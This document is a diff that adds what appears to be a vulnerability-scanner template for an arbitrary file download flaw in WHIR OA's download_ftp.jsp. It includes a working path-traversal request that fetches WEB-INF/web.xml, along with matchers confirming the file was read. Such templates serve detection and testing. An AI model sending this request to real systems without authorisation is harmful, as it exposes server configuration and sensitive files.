@@ -1,0 +1,26 @@
+id: poc-yaml-whir-oa-download-ftp-jsp-anyfile-upload
+info:
+  name: WHIR OA download_ftp.jsp Arbitrary File Download Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    WHIR OA download_ftp.jsp contains an arbitrary file download vulnerability. It allows attackers to download sensitive files from the server.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/defaultroot/download_ftp.jsp?path=/../WEB-INF/&name=aaa&FileName=web.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<display-name>defaultroot</display-name>"
+          - "<servlet-name>"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
